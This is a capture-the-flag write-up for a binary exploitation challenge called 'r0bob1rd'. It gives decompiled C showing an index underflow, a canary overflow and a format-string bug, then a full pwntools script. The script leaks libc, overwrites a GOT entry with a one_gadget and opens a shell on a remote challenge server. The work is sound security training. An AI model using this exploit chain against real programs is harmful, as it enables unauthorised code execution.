- This challenge is a combination of a #bufferunderflow, #bufferoverflow and #fstring exploit. It is partial RELRO, no PIE
- The following function is vulnerable to each of the vulnerabilities:
### operation
```c
int64_t operation()
    void* fsbase
    int64_t canary = *(fsbase + 0x28)
    printf(format: "\nSelect a R0bob1rd > ")
    fflush(fp: stdout)
    int32_t birdSelect
    __isoc99_scanf(format: &decimal, &birdSelect)
    
    if (birdSelect s< 0 || birdSelect s> 9)
        // leak GOT entry
        printf(format: "\nYou've chosen: %s", &(&robobirdNames)[sx.q(birdSelect)])
    else
        printf(format: "\nYou've chosen: %s", (&robobirdNames)[sx.q(birdSelect)])
    
    getchar()
    puts(str: "\n\nEnter bird's little descript…")
    printf(format: &_> )
    char inp[0x68]
    fgets(buf: &inp, n: 0x6a, fp: stdin) // buffer overflow
    puts(str: "Crafting..")
    usleep(useconds: 2000000)
    start_screen()
    puts(str: "[Description]")
    printf(format: &inp)  // fstring vuln
    int64_t result = canary ^ *(fsbase + 0x28)
    
    if (result == 0)
        return result
    
    __stack_chk_fail()  // overwrite this GOT entry and overwrite canary
    noreturn
```
- We're able to provide a negative number to the `birdSelect` input in order to leak a `libc` address
- Then, the `fgets` call allows us to overwrite 2 bytes of the stack `canary` which will trigger the `__stack_chk_fail` function
- Finally, there is a vulnerable `printf()` call without a format specifier, giving us a format string exploitation primitive

### attack flow
- We provide a specific negative number to leak a `libc` address of the `GOT`
- We then create our format string payload which will overwrite the `GOT` address of `__stack_chk_fail` to our `one_gadget` while ensuring that our payload overflows into the stored canary, triggering `__stack_chk_fail`

### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./r0bob1rd_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

idxOffset = (0x602030 - 0x6020A0) // 8
inputOffset = 0x68
libcOffset = 0x61C90

context.log_level = "debug"
io = remote("94.237.120.119", 34967)

# leak libc
io.sendlineafter(b"Select a R0bob1rd > ", str(idxOffset).encode())
io.recvuntil(b"You've chosen: ")
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - libcOffset
info("libcBase: %#x", libc.address)

# fmtstr GOT overwrite
gadget = 0xE3B01
payload = fmtstr_payload(
    offset=8,
    writes={elf.got.puts + 8: p64(gadget + libc.address)},
    write_size="short",
)
payload = flat({0: payload, inputOffset: b"aa"})
io.sendlineafter(b"Enter bird's little description", payload)

io.interactive()
```

